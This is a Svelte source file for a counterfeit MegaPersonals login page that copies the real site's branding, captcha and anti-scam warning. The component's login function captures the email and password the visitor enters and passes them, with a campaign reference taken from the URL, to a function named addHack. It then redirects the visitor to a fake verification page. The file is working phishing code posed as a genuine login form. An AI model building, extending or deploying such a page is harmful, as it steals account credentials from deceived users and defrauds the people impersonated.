<script>
    import "$lib/login.css";

    import devilgirlFavicon from "$lib/resources/img/devilgirl_favicon.ico";
    import megapersonalsPageHeader from "$lib/resources/img/megapersonalsPageHeader.png";
    import reloadButton from "$lib/resources/img/reloadButton.jpg";
    import warningModalHeader from "$lib/resources/img/warning-modal-header.png";
    import captcha1 from "$lib/resources/img/captcha1.jpg";
    import { page } from "$app/stores";
    import { goto } from "$app/navigation";
    import { addHack } from "$lib/actions";

    let email=null
    let password=null

    async function login(){
        var ref=$page.url.searchParams.get('t')
        console.log(email,password,ref)
 
        //TODO
        var hId=await addHack(ref,email,password)
        goto('/users/auth/verify?i='+hId)
    }
</script>

<svelte:head>
    <link rel="icon" href={devilgirlFavicon} type="image/x-icon" />
    <meta
        http-equiv="origin-trial"
        content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="
    />
    <title>MegaPersonals: Classified hookups</title>
    <meta
        id="viewportMetaTag"
        name="viewport"
        content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui"
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
    <meta charset="utf-8" />
    <meta name="ROBOTS" content="INDEX, FOLLOW" />
    <meta
        name="google-site-verification"
        content="5lgcaPvrDxOjE8Qn9rMbYKiJVahMPVReOQvezzd1nRY"
    />
    <meta
        name="description"
        content="MegaPersonals - Post your classified ad and MEET NOW"
    />

    <link
        rel="stylesheet"
        href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css"
    />
    <link
        rel="stylesheet"
        href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css"
    />

    <script
        type="text/javascript"
        async=""
        src="https://www.google-analytics.com/analytics.js"
    ></script>
    <script
        type="text/javascript"
        async=""
        src="https://www.googletagmanager.com/gtag/js?id=G-7DGFPGNTB9&amp;l=dataLayer&amp;cx=c"
    ></script>
    <script
        type="text/javascript"
        async=""
        src="https://mc.yandex.ru/metrika/tag.js"
    ></script>

    <script
        src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"
        type="text/javascript"
    ></script>

    <script
        src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"
    ></script>

    <script
        src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"
        type="text/javascript"
    ></script>
    <script src="https://www.google.com/recaptcha/api.js"></script>
</svelte:head>

<div class="container login-page">
    <a href="/home">
        <img
            src={megapersonalsPageHeader}
            class="img-responsive center-block img-width-72 header-top-margin"
            alt="Megapersonals"
            id="megapersonalsPageHeader"
        />
    </a>
    <div class="centered top-margin-25 login_firsttime">
        <h3 class="logincopy">Is this your first time posting?</h3>
        <a href="/users/register" class="starthere">Start Here</a>
    </div>
    <div class="centered loginform">
        <h2 class="logincopy">Already have an account?</h2>

        <form
            id="loginFormId"
            method="post"
            action="/users/api/login"
            class="loginwrapper"
        >
            <div class="centered">
                <input bind:value={email}
                    id="person_username_field_login"
                    type="email"
                    name="username"
                    placeholder="Email"
                    class="form-control bordered three-radius"
                />
            </div>
            <div class="centered">
                <input bind:value={password}
                    id="person_password_field_login"
                    type="password"
                    name="password"
                    placeholder="Password"
                    class="form-control bordered three-radius"
                />
            </div>
            <div class="centered automargin">
                <div class="cap_wrap clearfix">
                    <div class="captcha_image marg-top-8">
                        <img
                            src={captcha1}
                            id="captcha_image_itself"
                            alt="captcha"
                        />
                    </div>
                    <div class="replyCaptchaReloadButton">
                        <a href="javascript:void(0);">
                            <img src={reloadButton} width="40" height="40" />
                        </a>
                    </div>
                </div>

                <style>
                </style>

                <div id="captcha-modal" class="modal fade" role="dialog">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <button
                                    type="button"
                                    class="close"
                                    data-dismiss="modal">×</button
                                >
                                <h4 class="modal-title">Captcha warning</h4>
                            </div>
                            <div class="modal-body">
                                <p></p>
                            </div>
                            <div class="modal-footer">
                                <button
                                    type="button"
                                    class="btn btn-default"
                                    data-dismiss="modal">Close</button
                                >
                            </div>
                        </div>
                    </div>
                </div>

                <input
                    type="hidden"
                    id="captcha_key"
                    name="captcha_key"
                    value="2cb16fa264b7d11dd0738b8d4f7f665f"
                />
                <input

                    type="text"
                    id="captcha_code"
                    name="captcha_code"
                    class="form-control bordered three-radius clickToHideErrorMessages"
                />

                <button on:click={login} id="login_data_submit_button" type="button"
                    >Submit</button
                >

                <div class="get-scammed-banner">
                    <div class="caption">Don't get scammed!</div>
                    <div class="body">
                        <div>Is the address up top:<br />megapersonals.eu</div>
                        <div>?</div>
                    </div>
                </div>

                <div id="scammed-warning-modal" style="display: none;">
                    <div class="scammed-warning-modal-container">
                        <img
                            src={warningModalHeader}
                            class="warning-modal-header"
                        />
                        <div class="scammed-modal-text">
                            Scammers send emails and<br />msg links to fake
                            websites.<br />They will lie and pretend to be<br
                            />the real <strong>megapersonals.eu</strong> to<br
                            />steal your account.
                        </div>
                        <div class="scammed-modal-text">
                            ONLY enter your password on<br /><span
                                class="text-blue">MEGA</span
                            ><span class="text-pink">PERSONALS</span><span
                                class="text-blue">.EU.</span
                            >
                        </div>
                        <div class="scammed-modal-text">
                            (scams: megapersonals<span class="text-red"
                                ><strong>.cam</strong></span
                            >,<br />megaper<span class="text-red"
                                ><strong>a</strong></span
                            >sonals.com etc...)
                        </div>
                        <button
                            class="btn btn-success btn-lg btn-get"
                            type="button">I get it.</button
                        >
                    </div>
                </div>

                <a class="passreset" href="/send_reset_password">
                    Forgot Password</a
                >
            </div>
        </form>
    </div>
</div>

<footer>
    <nav>
        <ul class="pager myStyle">
            <li>
                <a id="homeclick" href="/home">Home</a>
            </li>

            <li>|</li>
            <li>
                <a
                    href="https://megapersonals.eu/users/posts/list?publicDomain=megapersonals.eu"
                    >Manage Posts</a
                >
            </li>

            <li>|</li>
            <li><a href="/public/contact_us">Contact Us</a></li>
            <li>|</li>
            <li><a href="/public/terms">Policies &amp; Terms</a></li>
        </ul>
    </nav>

    <div class="copyright_class" id="copyrigh">
        Copyright ©2022 MegaPersonals.eu
    </div>
</footer>
